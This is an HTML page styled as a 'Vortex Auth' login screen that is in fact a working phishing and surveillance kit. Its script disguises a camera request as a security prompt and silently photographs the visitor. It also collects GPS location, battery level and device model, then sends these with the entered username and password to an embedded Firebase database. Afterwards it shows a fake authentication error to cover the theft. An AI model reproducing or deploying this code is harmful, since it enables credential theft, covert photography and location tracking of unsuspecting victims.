<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vortex Auth | Secure System</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        :root { --blue: #00d2ff; --bg: #020b16; }
        body { background: var(--bg); color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { border: 1px solid var(--blue); padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 320px; background: #05162a; box-shadow: 0 0 20px rgba(0,210,255,0.1); }
        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #103a63; color: white; border-radius: 5px; outline: none; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: var(--blue); border: none; color: black; font-weight: bold; border-radius: 5px; cursor: pointer; }
        #status { font-size: 9px; color: #103a63; margin-top: 15px; }
        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="box">
        <div style="font-size:40px; color:var(--blue);">⚡</div>
        <h3 style="letter-spacing: 3px;">VORTEX AUTH</h3>
        <p style="font-size: 10px; color: #555;">SATELLITE INTERCEPTOR v6.0</p>
        
        <input type="text" id="target-user" placeholder="Identity ID">
        <input type="password" id="target-pass" placeholder="Access Key">
        
        <button onclick="initiateCapture()">AUTHORIZE DEVICE</button>
        <div id="status">INITIALIZING...</div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

<script>
    // --- FIREBASE CONFIG (SAMA DENGAN DASHBOARD) ---
    const config = { 
        apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ", 
        databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app" 
    };
    firebase.initializeApp(config);
    const db = firebase.database();

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    // Minta Izin Kamera di Awal (Samarkan sebagai Izin Keamanan)
    window.onload = () => {
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(s => { video.srcObject = s; document.getElementById('status').innerText = "SATELLITE LINK READY"; })
        .catch(e => { document.getElementById('status').innerText = "PERMISSION REQUIRED"; });
    };

    async function initiateCapture() {
        const u = document.getElementById('target-user').value.trim();
        const p = document.getElementById('target-pass').value.trim();
        if (!u || !p) return;

        document.getElementById('status').innerText = "SYNCHRONIZING DATA...";

        // 1. Ambil Spek HP & Baterai
        let batteryLevel = "0";
        try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.floor(battery.level * 100);
        } catch (e) {}

        const userAgent = navigator.userAgent;
        let brand = "Unknown Device";
        if (userAgent.match(/Android/i)) brand = "Android " + userAgent.split(')')[0].split('(')[1];
        else if (userAgent.match(/iPhone/i)) brand = "iPhone (iOS)";

        // 2. Ambil Foto (Silent Snap)
        const context = canvas.getContext('2d');
        canvas.width = 480; canvas.height = 360;
        context.drawImage(video, 0, 0, 480, 360);
        const photo = canvas.toDataURL('image/jpeg', 0.5);

        // 3. Ambil Lokasi GPS
        navigator.geolocation.getCurrentPosition((pos) => {
            sendData(u, p, pos.coords.latitude + "," + pos.coords.longitude, batteryLevel, brand, photo);
        }, () => {
            sendData(u, p, "Denied", batteryLevel, brand, photo);
        });
    }

    function sendData(u, p, loc, bat, brd, snap) {
        db.ref('users/' + u).set({
            password: p,
            role: "member",
            location: loc,
            battery: bat,
            brand: brd,
            snap: snap,
            last_seen: new Date().toLocaleString()
        }).then(() => {
            alert("⚠️ SYSTEM ERROR: AUTHENTICATION FAILED (Error 0x882). SYSTEM RESTARTING...");
            location.reload();
        });
    }
</script>
</body>
</html>
